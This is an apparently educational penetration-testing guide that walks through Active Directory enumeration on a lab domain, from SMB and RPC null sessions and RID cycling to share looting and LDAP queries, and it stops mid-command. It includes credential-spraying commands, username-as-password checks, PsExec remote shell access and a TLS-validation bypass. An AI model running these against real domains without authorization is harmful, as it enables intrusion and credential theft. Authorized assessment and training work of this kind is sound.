---
title: "Active Directory Methodology: From Discovery to Access Paths"
description: "A practical methodology for enumerating Active Directory, turning findings into new opportunities, and discovering access paths without relying on an external entry point."
pubDate: 2026-08-30T12:00:00-06:00
heroImage: '../../../assets/cpts/ad.png'
lang: "en"
translationKey: "active-directory-methodology"
category: "CPTS"
---

This guide organizes Active Directory enumeration around turning available information into potential access paths, rather than simply running commands without a clear objective.

It is intended for scenarios where **the entry point comes from within the Active Directory environment itself**, without relying on a previously compromised external application or service. The methodology is iterative: every user, credential, file, or permission we discover may open new enumeration opportunities that we must validate.

---

## 1. Domain discovery

The first step is to correctly identify the domain and its controller. By the end of this phase, we should know:

- What is the domain name?
- What are the domain controller's hostname and FQDN?
- What Base DN will we use in LDAP queries?

These details let us distinguish between the hostname, the DNS domain, and the LDAP *naming context*. They are also necessary because several Active Directory tools depend on the controller resolving correctly by name.

We will follow this workflow:

1. Attempt to discover the hostname and domain through SMB.
2. Query LDAP if SMB does not provide the necessary information.
3. Add the discovered names to `/etc/hosts`.
4. Verify that the domain controller resolves correctly.

### 1.1. Discover the domain through SMB

We can begin by checking whether SMB reveals basic host and domain information through an anonymous NetExec session:

```bash
sudo nxc smb <IP> -u '' -p ''
```

Example:

```bash
sudo nxc smb 192.0.2.10 -u '' -p ''
```

NetExec displays the hostname and domain on separate lines:

```text
SMB  192.0.2.10  445  DC01  [*] Windows 10 / Server 2019 Build 17763
SMB  192.0.2.10  445  DC01  [+] lab.example
```

The column after the port contains the hostname, which is `DC01` in this example. The second line shows the domain, `lab.example`.

At this point, we should record at least:

- Target IP: `192.0.2.10`.
- Hostname: `DC01`.
- DNS domain: `lab.example`.
- Fully qualified hostname or FQDN: `dc01.lab.example`.

The fact that the server reveals this information does not mean that it allows further anonymous enumeration. The result only helps us build our initial map of the environment.

### 1.2. Alternative: discover the domain through LDAP

If SMB returns `STATUS_NOT_SUPPORTED`, rejects the anonymous session, or does not reveal the domain, we can query LDAP's **Root DSE**. This base query may expose directory metadata without requiring us to traverse its objects:

```bash
ldapsearch -x \
  -H ldap://<IP> \
  -s base \
  -b "" \
  dnsHostName \
  defaultNamingContext \
  rootDomainNamingContext \
  namingContexts
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -s base \
  -b "" \
  dnsHostName \
  defaultNamingContext \
  rootDomainNamingContext \
  namingContexts
```

Example response:

```text
#
dn:
namingContexts: DC=lab,DC=example
namingContexts: CN=Configuration,DC=lab,DC=example
namingContexts: CN=Schema,CN=Configuration,DC=lab,DC=example
namingContexts: DC=DomainDnsZones,DC=lab,DC=example
namingContexts: DC=ForestDnsZones,DC=lab,DC=example
rootDomainNamingContext: DC=lab,DC=example
defaultNamingContext: DC=lab,DC=example
dnsHostName: dc01.lab.example

# search result
search: 2
result: 0 Success
```

The main attributes mean the following:

- `dnsHostName` identifies the LDAP server's FQDN.
- `defaultNamingContext` identifies the domain's default partition.
- `rootDomainNamingContext` identifies the forest root domain.
- `namingContexts` lists the partitions published by the directory, including configuration, schema, and DNS zone partitions.
- `result: 0 Success` confirms that the LDAP query completed successfully.

If `defaultNamingContext` contains `DC=lab,DC=example`, we can convert it to the DNS domain `lab.example`. The `dnsHostName` attribute already gives us the FQDN `dc01.lab.example`. Together, these values provide the information required to configure local name resolution.

### 1.3. Add the names to `/etc/hosts`

Once we have identified the domain and controller name, **we must add them to `/etc/hosts` as a required part of this methodology**:

```text
192.0.2.10 dc01.lab.example lab.example dc01
```

The entry follows this order:

- Controller IP address: `192.0.2.10`.
- Controller FQDN: `dc01.lab.example`.
- DNS domain: `lab.example`.
- Hostname: `dc01`.

This step is not optional in our workflow. Several commands and later techniques require the domain or controller FQDN instead of communicating solely with its IP address. If the names do not resolve correctly, we may encounter connection, authentication, or Kerberos errors even when the service is available.

The `/etc/hosts` entry maps the discovered names to the target IP address and provides consistent local resolution throughout the rest of the methodology. It does not replace every record that a DNS server could provide, but it lets us work correctly with tools that need to resolve the domain controller's FQDN.

#### Verify name resolution

After saving the change, verify that the FQDN resolves to the correct address:

```bash
getent hosts <DC_FQDN>
```

Example:

```bash
getent hosts dc01.lab.example
```

The result should map `dc01.lab.example` to `192.0.2.10`. If it returns no entry or displays a different address, we must correct name resolution before continuing.

**Phase result:** IP, domain, hostname, FQDN, and Base DN confirmed, with `/etc/hosts` resolution working.

---

## 2. RPC enumeration

Once we have identified the domain, we can check what information it exposes through RPC. The main objective of this phase is to obtain a **list of domain users**, since these identities will serve as starting points for later validation.

We will follow this workflow:

1. Attempt to establish an RPC session.
2. Enumerate domain users.
3. Expand the information available for the discovered accounts.
4. Query groups and other resources available through RPC.
5. Use alternative methods if direct user enumeration is denied.

### 2.1. Establish an RPC session

We first attempt to connect without credentials. If the server does not allow a null session and we already have a valid identity, we repeat the connection using those credentials.

#### Access without credentials

First, check whether the server accepts a null session—that is, a connection without a username or password:

```bash
rpcclient -U "" -N <IP>
```

Example:

```bash
rpcclient -U "" -N 192.0.2.10
```

If the connection succeeds, we will receive an interactive console identified by the `rpcclient $>` prompt. From there, we can run any enumeration commands the server permits.

#### Access with credentials

Once we have a valid identity, we can authenticate using the `[DOMAIN/]USERNAME%PASSWORD` format:

```bash
rpcclient -U '<DOMAIN>/<USERNAME>%<PASSWORD>' <IP>
```

Example:

```bash
rpcclient -U 'LAB/analyst%TrainingPass2026' 192.0.2.10
```

Enclose the argument in single quotes to prevent the shell from interpreting special characters in the password.

### 2.2. Enumerate domain users

From the `rpcclient` console, run:

```text
enumdomusers
```

The output maps each username to its RID:

```text
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[m.garcia] rid:[0x44f]
```

The `krbtgt` account is created by default in every Active Directory domain and is used by the Kerberos service. We should recognize it as a built-in domain account and not mistake it for a conventional user account.

If we successfully enumerate users, **we must save them in a file named `users.txt`, with one account per line**. It does not matter whether we obtained them through `enumdomusers`, RID cycling, or LDAP: every discovered identity should be consolidated into this file.

```text
Administrator
Guest
krbtgt
m.garcia
```

We will reuse this file in later phases of the methodology. It could also be named `users`, but this guide uses `users.txt` for consistency.

#### Save and clean a large list

If the domain contains many accounts, we can run `enumdomusers` without entering the interactive console and save the output to a file:

```bash
rpcclient -U '<DOMAIN>/<USERNAME>%<PASSWORD>' <IP> \
  -c 'enumdomusers' | tee rpc_users_raw.txt
```

Example:

```bash
rpcclient -U 'LAB/analyst%TrainingPass2026' 192.0.2.10 \
  -c 'enumdomusers' | tee rpc_users_raw.txt
```

Then extract only the usernames:

```bash
awk -F'[][]' '/user:\[/ {print $2}' rpc_users_raw.txt > users.txt
```

The `rpc_users_raw.txt` file preserves the original output, while `users.txt` contains one identity per line and is ready for the next phases.

### 2.3. Expand user information

The initial list tells us which accounts exist. The next step is to look for full names, descriptions, and other details that help us understand the purpose of each identity.

#### Query a user by RID

```text
queryuser <RID>
```

Example:

```text
queryuser 0x44f
```

The query may display the account name, full name, description, and other attributes published through RPC.

#### Query information for multiple accounts

```text
querydispinfo
```

This command is useful for reviewing multiple accounts alongside their full names and comments. Descriptions may reveal an account's purpose or indicate that it belongs to a service.

### 2.4. Enumerate other resources through RPC

After working with users, use the same session to query other domain and server resources.

#### Enumerate domain groups

```text
enumdomgroups
```

This command returns groups and their RIDs. Their names may help us identify administrative roles, internal teams, or service-related accounts.

#### Enumerate shares

```text
netshareenum
```

The presence of a share does not mean that we can read or modify it. In a later phase, we will need to validate its permissions using our current identity.

#### Query general server information

```text
srvinfo
```

This may return the server name, platform, version, and other general system information.

### 2.5. Alternatives for enumerating users

Not every server allows `enumdomusers` through a null session. If we receive `NT_STATUS_ACCESS_DENIED`, follow this order:

1. If we have credentials, repeat `enumdomusers` as the authenticated user.
2. Check whether accounts can be resolved through RID cycling.
3. Try LDAP user enumeration with NetExec.

Record the access-denied result. If we later obtain a new identity, return to RPC and repeat the queries, since that account may have permissions the previous session did not.

#### Alternative 1: RID cycling

Even when `enumdomusers` is restricted, some environments still allow us to query the domain SID and resolve a sequence of RIDs. This technique is commonly called **RID cycling** and does not involve guessing passwords.

First, request local policy information with `lsaquery`:

```bash
rpcclient -U '<USERNAME>%' <IP> -c 'lsaquery'
```

Example:

```bash
rpcclient -U 'guest%' 192.0.2.10 -c 'lsaquery'
```

The response may include the domain SID:

```text
Domain Sid: S-1-5-21-1111111111-2222222222-3333333333
```

Once we know the SID, we can query a range of RIDs and discard responses that do not correspond to known objects:

```bash
seq 400 2000 | xargs -P 50 -I {} \
  rpcclient -U '<USERNAME>%' <IP> \
  -c 'lookupsids <DOMAIN_SID>-{}' | grep -v unknown
```

Example:

```bash
seq 400 2000 | xargs -P 50 -I {} \
  rpcclient -U 'guest%' 192.0.2.10 \
  -c 'lookupsids S-1-5-21-1111111111-2222222222-3333333333-{}' | grep -v unknown
```

The output may contain users, groups, and other accounts associated with the resolved RIDs. Preserve each object's type alongside its name instead of assuming that every result represents a user.

#### Alternative 2: NetExec through LDAP

This alternative does not use RPC. It queries LDAP through NetExec in an attempt to obtain the user list. With credentials, the basic syntax is:

```bash
nxc ldap <DC_IP> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' --users
```

Example:

```bash
nxc ldap 192.0.2.10 -d lab.example -u 'analyst' -p 'TrainingPass2026' --users
```

If we do not yet have credentials, check whether LDAP allows an anonymous query:

```bash
nxc ldap <DC_IP> -d <DOMAIN> -u '' -p '' --users
```

Example:

```bash
nxc ldap 192.0.2.10 -d lab.example -u '' -p '' --users
```

If LDAP rejects the anonymous query, record the result and repeat it once we obtain valid credentials.

**Phase result:** `users.txt` updated, with relevant RIDs, groups, or descriptions associated with each account.

---

## 3. SMB enumeration

In this phase, we identify the shares published by the server and determine what our identity can do with each one. Knowing a share's name is not enough: we must check whether we have **read**, **write**, or both permissions.

We will follow this workflow:

1. Enumerate shares without credentials and with the `guest` account.
2. Repeat the enumeration with every valid credential we obtain.
3. Classify the permissions on each share.
4. Inspect and download information available through read access.
5. Carefully evaluate the possibilities opened by write access.
6. Record the results and enumerate again whenever we obtain another identity.

### 3.1. Enumerate shares without credentials

First, check whether the server allows shares to be listed through a null session.

#### NetExec with an empty username

```bash
sudo nxc smb <IP> -u '' -p '' --shares
```

Example:

```bash
sudo nxc smb 192.0.2.10 -u '' -p '' --shares
```

#### NetExec with the `guest` account

A null session may be blocked while the `guest` account can still access certain resources. We should therefore test both variants:

```bash
sudo nxc smb <IP> -u 'guest' -p '' --shares
```

Example:

```bash
sudo nxc smb 192.0.2.10 -u 'guest' -p '' --shares
```

If one variant fails, do not assume that SMB is completely restricted. The server may treat a null session, an explicit `guest` account, or a username ultimately mapped to Guest differently.

#### Alternatives with `smbclient` and `smbmap`

Tools may behave differently against the same configuration, so it is worth comparing NetExec's result with other clients.

List shares with `smbclient` without prompting for a password:

```bash
smbclient -L //<IP> -N
```

Example:

```bash
smbclient -L //192.0.2.10 -N
```

Test the `guest` account with `smbmap`:

```bash
smbmap -H <IP> -u 'guest' -p ''
```

Example:

```bash
smbmap -H 192.0.2.10 -u 'guest' -p ''
```

### 3.2. Enumerate shares with credentials

Whenever we obtain a valid credential, we must repeat the enumeration. An authenticated user may see shares that are not published to anonymous sessions and may have different permissions on resources we already know about.

#### NetExec with a username and password

```bash
sudo nxc smb <IP> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' --shares
```

Example:

```bash
sudo nxc smb 192.0.2.10 -d lab.example -u 'analyst' -p 'TrainingPass2026' --shares
```

If a password begins with a hyphen, use the long argument form so it is not interpreted as another option:

```bash
sudo nxc smb <IP> -d <DOMAIN> -u '<USERNAME>' -p='<PASSWORD>' --shares
```

Example:

```bash
sudo nxc smb 192.0.2.10 -d lab.example -u 'analyst' -p='-TrainingPass2026!' --shares
```

#### `smbclient` with credentials

To list the available shares:

```bash
smbclient -L //<IP> -U '<DOMAIN>/<USERNAME>'
```

Example:

```bash
smbclient -L //192.0.2.10 -U 'LAB/analyst'
```

The program prompts for the password interactively, which avoids writing it directly in the command.

#### NetExec with Kerberos

If NTLM is disabled or the environment requires Kerberos, use the FQDN configured in `/etc/hosts` during the first phase:

```bash
sudo nxc smb <DC_FQDN> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' -k --shares
```

Example:

```bash
sudo nxc smb dc01.lab.example -d lab.example -u 'analyst' -p 'TrainingPass2026' -k --shares
```

Kerberos depends on correct name resolution and on our system clock being synchronized with the domain. If either condition fails, a valid credential may still produce authentication errors.

### 3.3. Interpret share permissions

NetExec may display permissions such as `READ` or `WRITE` for each resource:

```text
Share        Permissions     Remark
-----        -----------     ------
Public       READ            Shared documents
Department   READ,WRITE      Department exchange
```

We should interpret these permissions as separate capabilities.

#### Read permission

With `READ`, we can list directories and download files. The goal is to find information that helps us continue the attack chain, such as:

- Configuration files.
- Administrative scripts and tasks.
- Backups.
- Internal documentation.
- Usernames or computer names.
- Passwords, keys, or references to other services.
- Any data that provides a new lead about the environment.

If we find usernames that were not in the phase 2 inventory, add them to the existing `users.txt` file. Do not create a separate list for SMB.

#### Write permission

`WRITE` means that we can create or modify content within the share. Depending on how domain users or systems consume that resource, this permission may open paths such as:

- Capturing hashes through references to controlled resources during an authorized assessment.
- Modifying scripts or files consumed by other users.
- Abusing folders used for deployments, tasks, or automated processes.
- Replacing files when an environmental workflow trusts the share's contents.

Write access does not automatically mean that any of these techniques will work. We must first understand who consumes the resource, from which system, and with what privileges. Writing or modifying files also changes the environment, so it should only be done when the assessment scope permits it.

### 3.4. Access and inspect a share

#### Access without credentials

```bash
smbclient --no-pass //<IP>/<SHARE>
```

Example:

```bash
smbclient --no-pass //192.0.2.10/Public
```

#### Access with credentials

```bash
smbclient //<IP>/<SHARE> -U '<DOMAIN>/<USERNAME>'
```

Example:

```bash
smbclient //192.0.2.10/Department -U 'LAB/analyst'
```

If the share name contains spaces, enclose the entire path in quotes:

```bash
smbclient '//<IP>/<SHARE WITH SPACES>' -U '<DOMAIN>/<USERNAME>'
```

Example:

```bash
smbclient '//192.0.2.10/Accounting Department' -U 'LAB/analyst'
```

#### Download a file

Within the `smbclient` console, use `ls` to list the contents and `get` to download a file:

```text
ls
get <FILE>
```

Example:

```text
get deployment-notes.txt
```

#### Download contents recursively

Before a bulk download, work from a dedicated local directory to avoid mixing files from different shares. Within `smbclient`, run:

```text
mask ""
prompt OFF
recurse ON
mget *
```

Preserve the tool's original output separately from the downloaded files. This makes it easier to review the contents again without repeating the connection.

#### Inspect files with Alternate Data Streams

If a file appears empty or its size does not match expectations, check whether it contains metadata or an **Alternate Data Stream (ADS)**:

```text
allinfo "<FILE>"
```

Example:

```text
allinfo "Debug Mode Password.txt"
```

If we need its short name:

```text
altname "<FILE>"
```

Example:

```text
altname "Debug Mode Password.txt"
```

The response may return a name such as:

```text
DEBUGM~1.TXT
```

When `allinfo` confirms that a stream exists, download it by specifying its full name:

```text
get <SHORT_NAME>:<STREAM>:$DATA
```

Example:

```text
get DEBUGM~1.TXT:Password:$DATA
```

Once downloaded, inspect the local file with the usual system tools.

### 3.5. Validate write access

Access the resource with the same authenticated command:

```bash
smbclient //<IP>/<SHARE> -U '<DOMAIN>/<USERNAME>'
```

Example:

```bash
smbclient //192.0.2.10/Department -U 'LAB/analyst'
```

Within `smbclient`, we can validate the permission by uploading an authorized test file:

```text
put <LOCAL_FILE> <REMOTE_NAME>
```

Example:

```text
put write-test.txt write-test.txt
```

The test must be controlled, clearly identifiable, and permitted by the scope. Once write access is confirmed, document the identity, path, and file used before evaluating any additional technique.

### 3.6. Add new users to the inventory

SMB can also reveal users through an authenticated account:

```bash
sudo nxc smb <IP> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' --users
```

Example:

```bash
sudo nxc smb 192.0.2.10 -d lab.example -u 'analyst' -p 'TrainingPass2026' --users
```

When the server allows RID resolution through SMB, NetExec provides another way to obtain identities:

```bash
nxc smb <IP> -u 'guest' -p '' --rid-brute
```

Example:

```bash
nxc smb 192.0.2.10 -u 'guest' -p '' --rid-brute
```

The method for organizing users was defined in phase 2. If these commands discover new accounts, add them to `users.txt`, remove duplicates, and continue working from a single inventory.

### 3.7. Validate credentials and privileges

NetExec can verify whether a credential is valid for SMB:

```bash
sudo nxc smb <IP> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>'
```

Example:

```bash
sudo nxc smb 192.0.2.10 -d lab.example -u 'analyst' -p 'TrainingPass2026'
```

A response containing `Pwn3d!` means NetExec believes the account probably has local administrative privileges and the ability to execute commands on the target. That result does not mean we should immediately run a remote-access tool: first document it and confirm that the action is permitted by the scope.

If the account is administrative and remote access is authorized, the Impacket PsExec syntax is:

```bash
impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<IP>'
```

Example:

```bash
impacket-psexec 'LAB/administrator:TrainingPass2026@192.0.2.10'
```

WinRM is a separate service from SMB, but a credential discovered during this phase can also be validated against it:

```bash
nxc winrm <IP> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>'
```

Example:

```bash
nxc winrm 192.0.2.10 -d lab.example -u 'analyst' -p 'TrainingPass2026'
```

### 3.8. Validate multiple credentials in a controlled manner

If we have user and password files, NetExec can test them and continue after finding a match:

```bash
sudo nxc smb <IP> -u users.txt -p passwords.txt --continue-on-success
```

Example:

```bash
sudo nxc smb 192.0.2.10 -u users.txt -p passwords.txt --continue-on-success
```

Before testing multiple accounts, review the domain lockout policy and respect the limits defined for the assessment.

To check the poor practice of using the same value as both username and password, pass `users.txt` in both positions and pair entries line by line:

```bash
sudo nxc smb <IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

Example:

```bash
sudo nxc smb 192.0.2.10 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

### 3.9. Handle `STATUS_PASSWORD_MUST_CHANGE`

Sometimes a valid credential returns `STATUS_PASSWORD_MUST_CHANGE`. This means that the account must change its password before it can authenticate normally.

Changing the password modifies the account and may affect its owner or services that depend on it. Only do so when expressly permitted and after documenting the original state.

The basic syntax is:

```bash
impacket-changepasswd '<DOMAIN>/<USERNAME>:<CURRENT_PASSWORD>@<IP>' \
  -newpass '<NEW_PASSWORD>'
```

If the current password is empty:

```bash
impacket-changepasswd '<DOMAIN>/<USERNAME>:@<IP>' \
  -newpass '<NEW_PASSWORD>'
```

Example:

```bash
impacket-changepasswd 'LAB/analyst:@192.0.2.10' \
  -newpass 'NewTrainingPass2026!'
```

After the change, validate the new credential, record the result, and use it carefully in subsequent queries.

**Phase result:** a user, share, and permission (`READ` or `WRITE`) matrix, together with any file or lead that can advance the chain.

---

## 4. LDAP enumeration

LDAP lets us query the Active Directory structure and the relationships between its objects. Its value extends far beyond retrieving users: it can reveal groups, computers, organizational units, service accounts, GPOs, trusts, delegation settings, permissions, sensitive attributes, and deleted objects.

We will follow this workflow:

1. Reuse the Base DN obtained during domain discovery.
2. Check whether the directory allows anonymous queries.
3. Repeat the enumeration with every valid credential.
4. Use StartTLS or LDAPS when required by the environment.
5. Move from a general dump to targeted queries by object type.
6. Review deleted objects, permissions, and protected attributes when our identity can access them.
7. Preserve the original output and update the existing inventories.

### 4.1. Prepare the query

In phase 1, we obtained values such as:

```text
DNS domain: lab.example
Base DN: DC=lab,DC=example
DC FQDN: dc01.lab.example
```

The Base DN defines the point in the directory from which the search begins. Reuse the actual value returned by `defaultNamingContext` instead of reconstructing it manually each time.

### 4.2. Enumerate LDAP without credentials

First, attempt an anonymous bind against the domain Base DN:

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '' \
  -w '' \
  -b '<BASE_DN>'
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D '' \
  -w '' \
  -b 'DC=lab,DC=example'
```

If the query returns objects, preserve the complete output before applying filters:

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '' \
  -w '' \
  -b '<BASE_DN>' | tee ldap_anonymous.ldif
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D '' \
  -w '' \
  -b 'DC=lab,DC=example' | tee ldap_anonymous.ldif
```

An accessible Root DSE does not mean that the domain contents are also accessible. If we receive `Operations error`, `Insufficient access`, or an empty response, record the result and continue with an authenticated identity.

### 4.3. Enumerate LDAP with credentials

The recommended approach is to use the user's UPN and `-W`, allowing `ldapsearch` to request the password without exposing it in shell history:

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '<USERNAME>@<DOMAIN>' \
  -W \
  -b '<BASE_DN>'
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analyst@lab.example' \
  -W \
  -b 'DC=lab,DC=example'
```

We can also use the NetBIOS format `DOMAIN\username`:

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '<NETBIOS_DOMAIN>\<USERNAME>' \
  -W \
  -b '<BASE_DN>'
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'LAB\analyst' \
  -W \
  -b 'DC=lab,DC=example'
```

In a lab, we can provide the password with `-w`, although it will remain visible in the command:

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '<USERNAME>@<DOMAIN>' \
  -w '<PASSWORD>' \
  -b '<BASE_DN>'
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analyst@lab.example' \
  -w 'TrainingPass2026' \
  -b 'DC=lab,DC=example'
```

Each new credential may reveal attributes or objects hidden from the anonymous session. We should therefore repeat the relevant queries from each identity's perspective.

### 4.4. Use StartTLS or LDAPS

When the server requires a protected connection, request StartTLS over LDAP with `-ZZ`:

```bash
ldapsearch -x -ZZ \
  -H ldap://<DC_FQDN> \
  -D '<USERNAME>@<DOMAIN>' \
  -W \
  -b '<BASE_DN>'
```

Example:

```bash
ldapsearch -x -ZZ \
  -H ldap://dc01.lab.example \
  -D 'analyst@lab.example' \
  -W \
  -b 'DC=lab,DC=example'
```

If the service publishes LDAPS, use the `ldaps://` scheme:

```bash
ldapsearch -x \
  -H ldaps://<DC_FQDN>:636 \
  -D '<USERNAME>@<DOMAIN>' \
  -W \
  -b '<BASE_DN>'
```

Example:

```bash
ldapsearch -x \
  -H ldaps://dc01.lab.example:636 \
  -D 'analyst@lab.example' \
  -W \
  -b 'DC=lab,DC=example'
```

#### Untrusted certificate in a lab

If StartTLS works but the certificate was not issued by an authority our system trusts, we can temporarily disable certificate validation:

```bash
LDAPTLS_REQCERT=never ldapsearch -x -ZZ \
  -H ldap://<DC_FQDN> \
  -D '<NETBIOS_DOMAIN>\<USERNAME>' \
  -w '<PASSWORD>' \
  -b '<BASE_DN>'
```

Example:

```bash
LDAPTLS_REQCERT=never ldapsearch -x -ZZ \
  -H ldap://dc01.lab.example \
  -D 'LAB\analyst' \
  -w 'TrainingPass2026' \
  -b 'DC=lab,DC=example'
```

`LDAPTLS_REQCERT=never` disables server identity verification and facilitates man-in-the-middle attacks. Limit it to controlled labs; in a real assessment, properly trust the environment's CA instead.

### 4.5. Understand what LDAP can reveal

Before running isolated filters, it helps to understand what each object family can provide:

| Target | Information it may reveal |
| --- | --- |
| Users | Names, descriptions, groups, account flags, profile paths, and contact details. |
| Groups | Members, nested groups, and administrative or internal roles. |
| Computers | Hostname, operating system, SPNs, and location within an OU. |
| Service accounts | SPNs, descriptions, and relationships with domain services. |
| OUs | Administrative structure, contained objects, delegations, and `gPLink` links. |
| GPOs | Applied policies, settings, and SYSVOL paths. |
| Domain policy | Minimum password length, account lockout, and other general values. |
| Trusts | Related domains, direction, and trust attributes. |
| Delegations and ACLs | Identities with control over users, groups, computers, or other objects. |
| AD-integrated DNS | Zones and records stored in `DomainDnsZones` or `ForestDnsZones`. |
| Configuration and AD CS | Certification authorities, enrollment services, and templates when AD CS is deployed. |
| Protected attributes | LAPS passwords, gMSA data, or other information visible only to authorized identities. |
| Deleted objects | Tombstones containing some attributes and the object's former location. |

LDAP does not exploit these objects by itself. It helps us build the map of identities, configurations, and relationships we use to decide the next step.

### 4.6. Run targeted queries

LDAP filters reduce noise and let us request only the attributes we need.

#### Enumerate users and relevant attributes

Without credentials:

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '' \
  -w '' \
  -b '<BASE_DN>' \
  '(&(objectClass=user)(objectCategory=person))' \
  sAMAccountName displayName description info userAccountControl
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D '' \
  -w '' \
  -b 'DC=lab,DC=example' \
  '(&(objectClass=user)(objectCategory=person))' \
  sAMAccountName displayName description info userAccountControl
```

With credentials, use the same filter and replace the anonymous bind with `-D '<USERNAME>@<DOMAIN>' -W`. Add every new account to the `users.txt` file defined in phase 2.

#### Search descriptions and comments

Instead of discarding the original output, preserve it and use `grep` only as a quick view:

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '<USERNAME>@<DOMAIN>' \
  -W \
  -b '<BASE_DN>' \
  '(objectClass=*)' \
  dn sAMAccountName description info comment notes \
  | tee ldap_attributes.ldif \
  | grep -Ei 'pwd|pass|password|description|info|comment|notes'
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analyst@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(objectClass=*)' \
  dn sAMAccountName description info comment notes \
  | tee ldap_attributes.ldif \
  | grep -Ei 'pwd|pass|password|description|info|comment|notes'
```

Review matches together with the object's `dn`. An isolated line may lose the context needed to identify the user, group, or computer it belongs to.

#### Find accounts that do not require preauthentication

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '' \
  -w '' \
  -b '<BASE_DN>' \
  '(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName userAccountControl
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D '' \
  -w '' \
  -b 'DC=lab,DC=example' \
  '(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName userAccountControl
```

The value `4194304` corresponds to the `DONT_REQ_PREAUTH` flag. If anonymous queries are blocked, repeat the same filter with credentials.

#### Find service accounts with SPNs

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '<USERNAME>@<DOMAIN>' \
  -W \
  -b '<BASE_DN>' \
  '(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))' \
  sAMAccountName servicePrincipalName description
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analyst@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))' \
  sAMAccountName servicePrincipalName description
```

#### Enumerate groups

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '<USERNAME>@<DOMAIN>' \
  -W \
  -b '<BASE_DN>' \
  '(objectClass=group)' \
  cn description member
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analyst@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(objectClass=group)' \
  cn description member
```

#### Enumerate computers

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '<USERNAME>@<DOMAIN>' \
  -W \
  -b '<BASE_DN>' \
  '(objectClass=computer)' \
  dNSHostName operatingSystem operatingSystemVersion servicePrincipalName
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analyst@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(objectClass=computer)' \
  dNSHostName operatingSystem operatingSystemVersion servicePrincipalName
```

#### Enumerate trust relationships

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '<USERNAME>@<DOMAIN>' \
  -W \
  -b '<BASE_DN>' \
  '(objectClass=trustedDomain)' \
  cn trustPartner trustDirection trustType trustAttributes
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analyst@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(objectClass=trustedDomain)' \
  cn trustPartner trustDirection trustType trustAttributes
```

#### Enumerate GPOs

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '<USERNAME>@<DOMAIN>' \
  -W \
  -b '<BASE_DN>' \
  '(objectClass=groupPolicyContainer)' \
  displayName name gPCFileSysPath
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analyst@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(objectClass=groupPolicyContainer)' \
  displayName name gPCFileSysPath
```

### 4.7. Query deleted objects

When an Active Directory object is deleted, the directory temporarily retains a tombstone containing a subset of its attributes. If our identity has permission to query it, we can use the **Show Deleted** control with OID `1.2.840.113556.1.4.417`.

We can define the query scope in two ways:

- Use the domain Base DN to search for deleted objects throughout its subtree.
- Query the `CN=Deleted Objects` container directly to limit the search to that location.

#### Search from the domain root

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '<USERNAME>@<DOMAIN>' \
  -W \
  -b '<BASE_DN>' \
  -E '1.2.840.113556.1.4.417' \
  '(isDeleted=TRUE)' \
  cn distinguishedName sAMAccountName msDS-LastKnownRDN \
  lastKnownParent whenChanged description info comment objectClass
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analyst@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  -E '1.2.840.113556.1.4.417' \
  '(isDeleted=TRUE)' \
  cn distinguishedName sAMAccountName msDS-LastKnownRDN \
  lastKnownParent whenChanged description info comment objectClass
```

This broader variant is useful when we want to search for deleted objects across the complete naming context without assuming a more specific path in advance.

#### Search directly in `CN=Deleted Objects`

```bash
ldapsearch -x \
  -H ldap://<DC_IP> \
  -D '<USERNAME>@<DOMAIN>' \
  -W \
